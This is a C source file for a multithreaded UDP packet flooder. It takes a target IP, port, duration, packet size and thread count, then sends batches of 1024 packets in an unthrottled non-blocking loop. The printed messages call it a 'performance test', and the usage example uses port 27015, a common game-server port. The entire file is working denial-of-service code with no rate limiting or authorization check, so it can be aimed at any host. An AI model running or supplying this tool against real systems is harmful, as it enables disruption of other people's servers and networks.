#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/socket.h>
#include <fcntl.h>

#define VLEN 1024  // Number of packets to batch together in a single system call

typedef struct {
    char ip[16];
    int port;
    int packet_size;
} target_config_t;

volatile int keep_running = 1;

void *udp_traffic_worker(void *arg) {
    target_config_t *config = (target_config_t *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket to non-blocking mode to prevent network buffer bottlenecks
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(config->port);
    if (inet_pton(AF_INET, config->ip, &dest_addr.sin_addr) <= 0) {
        perror("Invalid IP address format");
        close(sock);
        pthread_exit(NULL);
    }

    // Allocate a buffer filled with dummy data
    char *payload = malloc(config->packet_size);
    if (!payload) {
        perror("Memory allocation failed");
        close(sock);
        pthread_exit(NULL);
    }
    memset(payload, 'A', config->packet_size);

    // Set up structures for batch packet transmission (sendmmsg)
    struct mmsghdr msg[VLEN];
    struct iovec iov[VLEN];
    
    memset(msg, 0, sizeof(msg));
    for (int i = 0; i < VLEN; i++) {
        iov[i].iov_base = payload;
        iov[i].iov_len = config->packet_size;
        
        msg[i].msg_hdr.msg_name = &dest_addr;
        msg[i].msg_hdr.msg_namelen = sizeof(dest_addr);
        msg[i].msg_hdr.msg_iov = &iov[i];
        msg[i].msg_hdr.msg_iovlen = 1;
    }

    // High-speed transmission loop
    while (keep_running) {
        // Send a massive batch of packets all at once
        // MSG_DONTWAIT prevents the loop from slowing down if system buffers fill up
        sendmmsg(sock, msg, VLEN, MSG_DONTWAIT);
    }

    free(payload);
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <PACKET_SIZE> <THREADS>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 27015 30 512 4\n", argv[0]);
        return 1;
    }

    target_config_t config;
    strncpy(config.ip, argv[1], sizeof(config.ip) - 1);
    config.ip[sizeof(config.ip) - 1] = '\0';
    config.port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    config.packet_size = atoi(argv[4]);
    int thread_count = atoi(argv[5]);

    if (config.port <= 0 || config.port > 65535 || duration <= 0 || config.packet_size <= 0 || thread_count <= 0) {
        fprintf(stderr, "Error: Invalid input parameters.\n");
        return 1;
    }

    printf("[!] Launching optimized batch-mode test targeting %s:%d\n", config.ip, config.port);
    printf("[!] Threads: %d | Packet Size: %d bytes | Duration: %d seconds\n", thread_count, config.packet_size, duration);

    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
    if (!threads) {
        perror("Thread memory allocation failed");
        return 1;
    }

    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, udp_traffic_worker, &config) != 0) {
            perror("Failed to create thread");
            free(threads);
            return 1;
        }
    }

    sleep(duration);

    printf("[!] Time elapsed. Stopping threads...\n");
    keep_running = 0;

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    printf("[+] Performance test complete.\n");
    return 0;
}
